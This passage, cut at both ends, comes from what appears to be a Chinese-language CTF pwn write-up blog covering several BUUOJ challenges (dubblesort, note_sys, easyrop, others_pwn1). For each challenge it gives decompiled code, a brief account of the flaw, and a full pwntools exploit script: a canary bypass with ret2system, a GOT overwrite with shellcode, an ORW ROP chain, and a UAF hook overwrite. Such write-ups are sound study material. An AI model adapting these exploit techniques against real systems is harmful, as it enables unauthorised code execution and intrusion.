<span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v11 )</span><br><span class="line">    sub_BA0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>read这里可以信息泄露，然后这里用了一个知识点，%u遇见+并不会写入东西，所以覆盖canary的时候直接利用+号来覆盖，这样的话就可以绕过canary了，v8并没有大小限制，所以可以不并的输入数据造成栈溢出，打ret为system即可，要算好次数</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./dubblesort'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">25621</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">dbgg()</span><br><span class="line">r.sendlineafter(<span class="string">'What your name :'</span>, <span class="string">'A'</span> * <span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u32(r.recvuntil(<span class="string">'\xf7'</span>)[-<span class="number">4</span>:])</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">li(<span class="string">'leak_addr = '</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1b000a</span></span><br><span class="line">li(<span class="string">'libc_base = '</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">b'/bin/sh'</span>).__next__()</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'How many numbers do you what to sort :'</span>, <span class="string">'35'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">'number : '</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'number : '</span>, <span class="string">'+'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">'number : '</span>, <span class="built_in">str</span>(system_addr))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'number : '</span>, <span class="built_in">str</span>(bin_sh))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="whctf2017-note-sys"><a href="#whctf2017-note-sys" class="headerlink" title="whctf2017_note_sys"></a>whctf2017_note_sys</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">sub_B86</span><span class="params">(<span class="type">void</span> *a1)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">void</span> **v3; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = (<span class="type">void</span> **)ptr;</span><br><span class="line">  ptr = (<span class="type">char</span> *)ptr - <span class="number">8</span>;</span><br><span class="line">  v2 = delete_flags - <span class="number">1</span>;</span><br><span class="line">  usleep(<span class="number">0x1E8480</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( delete_flags &lt;= <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"too less notes!!"</span>);</span><br><span class="line">    ptr = (<span class="type">char</span> *)ptr + <span class="number">8</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">free</span>(*v3);</span><br><span class="line">    delete_flags = v2;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"delete successfully!"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这是一个子线程，可以对ptr进行操作，然后睡2秒，但是就造成了一个条件竞争的问题，在睡的时候可以继续delete，ptr会一直-8</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">start_routine</span><span class="params">(<span class="type">void</span> *a1)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">void</span> **v2; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  ptr = (<span class="type">char</span> *)ptr + <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ++delete_flags &lt;= <span class="number">34</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"logged successfully!"</span>);</span><br><span class="line">    v2 = (<span class="type">void</span> **)ptr;</span><br><span class="line">    *v2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="built_in">memset</span>(*(<span class="type">void</span> **)ptr, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="built_in">memcpy</span>(*(<span class="type">void</span> **)ptr, a1, <span class="number">0xFA</span>uLL);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"too many notes!!"</span>);</span><br><span class="line">    ptr = (<span class="type">char</span> *)ptr - <span class="number">8</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>在add里，ptr这里会+上8，然后把content给拷贝到堆里去，这个堆的地址会保存在ptr里的指针里的地方</p>
<p>经过调试ptr里的值是2020C0，一直delete的话可以到got表那里，接着再add的话ptr里面是got表的地址，会把堆地址写到got表里，只需要在堆里布置shellcode，调用那个got即可getshell，这里选择puts，<code>0x2020c0 - 0x202028 = 0x98 0x98 / 8 = 19 19 + 1 = 20</code></p>
<p>delete 20次再add即可控制puts的got</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./note_sys'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">27217</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">'choice:'</span>, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">'choice:'</span>, <span class="string">'0'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'no more than 250 characters'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    delete()</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">add(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="roarctf-2019-easyrop"><a href="#roarctf-2019-easyrop" class="headerlink" title="roarctf_2019_easyrop"></a>roarctf_2019_easyrop</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">{</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">1032</span>]; <span class="comment">// [rsp+10h] [rbp-420h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+418h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+427h] [rbp-9h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+428h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  dword_6030A0 = <span class="number">0</span>;</span><br><span class="line">  sub_400FC4(a1, a2, a3);</span><br><span class="line">  sub_401968();</span><br><span class="line">  fwrite(<span class="string">"&gt;&gt; "</span>, <span class="number">1uLL</span>, <span class="number">3uLL</span>, <span class="built_in">stdout</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !feof(<span class="built_in">stdin</span>) )</span><br><span class="line">  {</span><br><span class="line">    v7 = fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = v8++;</span><br><span class="line">    v6 = v3;</span><br><span class="line">    v5[v3] = v7;</span><br><span class="line">  }</span><br><span class="line">  v5[v8] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_401678(v5) )</span><br><span class="line">  {</span><br><span class="line">    qsort(base, dword_6030AC, <span class="number">0x200</span>uLL, compar);</span><br><span class="line">    sub_401541();</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    sub_400E87();</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>存在溢出漏洞，但是需要注意会覆盖v8的值，想要正常溢出，需要把v8覆盖成0x428，v8距离v5是0x418，所以在覆盖的时候直接覆盖\x28这样子再继续写的话就直接控制ret了，一个orw即可</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./roarctf_2019_easyrop'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">27437</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">dbgg()</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401b93</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x4019F3</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">0x418</span> + <span class="string">b'\x28'</span></span><br><span class="line">p1 += p64(pop_rdi_ret) + p64(puts_got)</span><br><span class="line">p1 += p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'&gt;&gt; '</span>, p1)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'puts_addr = '</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = ELF(<span class="string">'./2.27/libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">pop_rsi_ret = <span class="number">0x0000000000023e6a</span> + libc_base</span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000001b96</span> + libc_base</span><br><span class="line">pop_rax_ret = <span class="number">0x00000000000439c8</span> + libc_base</span><br><span class="line">gets = libc.sym[<span class="string">'gets'</span>] + libc_base</span><br><span class="line"></span><br><span class="line">o = libc_base + libc.sym[<span class="string">'open'</span>]</span><br><span class="line">read = libc_base + libc.sym[<span class="string">'read'</span>]</span><br><span class="line">w = libc_base + libc.sym[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x6801C8</span> + <span class="number">0x100</span></span><br><span class="line">p2 = <span class="string">b'a'</span> * <span class="number">0x418</span> + <span class="string">b'\x28'</span></span><br><span class="line">p2 += p64(pop_rdi_ret) + p64(flag_addr)</span><br><span class="line">p2 += p64(gets)</span><br><span class="line">p2 += p64(pop_rdi_ret) + p64(flag_addr)</span><br><span class="line">p2 += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">p2 += p64(o)</span><br><span class="line">p2 += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">p2 += p64(pop_rsi_ret) + p64(flag_addr)</span><br><span class="line">p2 += p64(pop_rdx_ret) + p64(<span class="number">0x50</span>)</span><br><span class="line">p2 += p64(read)</span><br><span class="line">p2 += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">p2 += p64(pop_rsi_ret) + p64(flag_addr)</span><br><span class="line">p2 += p64(pop_rdx_ret) + p64(<span class="number">0x50</span>)</span><br><span class="line">p2 += p64(w)</span><br><span class="line">r.sendline(p2)</span><br><span class="line">r.sendline(<span class="string">'./flag\x00'</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="others-pwn1"><a href="#others-pwn1" class="headerlink" title="others_pwn1"></a>others_pwn1</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  index = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Which book you want to delete?"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%d"</span>, &amp;index);</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">0x10</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( table[index] )</span><br><span class="line">      <span class="built_in">free</span>(table[index]);                       <span class="comment">// uaf</span></span><br><span class="line">    --book_count;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of range!"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>一个uaf，逆出结构体之后发现利用uaf，edit可以改desc的指针，相当于任意地址读和任意地址写，打hook为ogg即可</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./pwn1'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">28313</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'&gt;&gt; '</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name, desc, many</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.sendafter(<span class="string">"Please give me the book's name :"</span>, name)</span><br><span class="line">    r.sendafter(<span class="string">"Please input the description about the book:"</span>, desc)</span><br><span class="line">    r.sendlineafter(<span class="string">'How many book you want to take?'</span>, <span class="built_in">str</span>(many))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, name, many</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Which book you want to edit?'</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendafter(<span class="string">"Please give me the book's name :"</span>, name)</span><br><span class="line">    r.sendlineafter(<span class="string">"Do you want to change the description?(y/n)"</span>, <span class="string">'n'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'How many book you want to take?'</span>, <span class="built_in">str</span>(many))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Which book you want to delete?'</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit2</span>(<span class="params">index, name, desc, many</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Which book you want to edit?'</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendafter(<span class="string">"Please give me the book's name :"</span>, name)</span><br><span class="line">    r.sendlineafter(<span class="string">"Do you want to change the description?(y/n)"</span>, <span class="string">'y'</span>)</span><br><span class="line">    r.sendafter(<span class="string">"Please input the description about the 